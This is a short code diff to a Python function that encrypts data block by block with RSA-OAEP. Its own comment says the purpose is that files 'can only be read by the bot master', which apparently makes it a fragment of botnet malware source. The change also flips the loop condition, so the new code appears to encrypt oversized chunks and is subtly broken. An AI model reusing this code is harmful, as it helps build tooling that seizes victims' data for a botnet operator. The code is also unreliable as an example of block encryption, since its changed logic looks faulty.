@@ -21,10 +21,10 @@ def encrypt_for_master(data, rsaKey):
     encrypted_data = b''
     OAEP_block_size = 470
     while index < len(data):
-        if (index + OAEP_block_size) < len(data):
-            encrypted_data += tmpCipher.encrypt(bytes(data[index:(index+OAEP_block_size)], "ascii"))
+        if (index + OAEP_block_size) > len(data):
+            encrypted_data += tmpCipher.encrypt(data[index:(index+OAEP_block_size)])
         else:
-            encrypted_data += tmpCipher.encrypt(bytes(data[index:], "ascii"))            
+            encrypted_data += tmpCipher.encrypt(data[index:])            
         index += OAEP_block_size
     # Encrypt the file so it can only be read by the bot master
     return encrypted_data
